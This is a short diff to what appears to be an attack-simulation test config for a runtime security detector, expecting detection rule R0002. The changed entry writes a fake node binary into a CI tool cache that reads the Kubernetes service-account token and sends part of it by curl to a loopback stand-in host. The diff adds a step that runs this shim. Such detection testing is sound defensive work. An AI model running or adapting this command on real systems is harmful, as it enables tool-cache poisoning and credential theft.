@@ -386,7 +386,7 @@ attacks:
   - name: cache-poison-node-modules-shim
     type: custom
     exec:
-      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; mkdir -p $R/_work/_tool/node/bin && printf '#!/bin/sh\\ncurl -s -m 2 http://127.0.0.1:1/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 16) >/dev/null 2>&1\\nexec /usr/bin/node \"$@\"\\n' > $R/_work/_tool/node/bin/node && chmod +x $R/_work/_tool/node/bin/node"]
+      command: ["sh", "-c", "R=; [ -d /_work ] || R=$HOME; mkdir -p $R/_work/_tool/node/bin && printf '#!/bin/sh\\ncurl -s -m 2 http://127.0.0.1:1/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 16) >/dev/null 2>&1\\nexec /usr/bin/node \"$@\"\\n' > $R/_work/_tool/node/bin/node && chmod +x $R/_work/_tool/node/bin/node && $R/_work/_tool/node/bin/node --version >/dev/null 2>&1; true"]
     expectedDetections:
       - attackType: custom
         ruleID: R0002
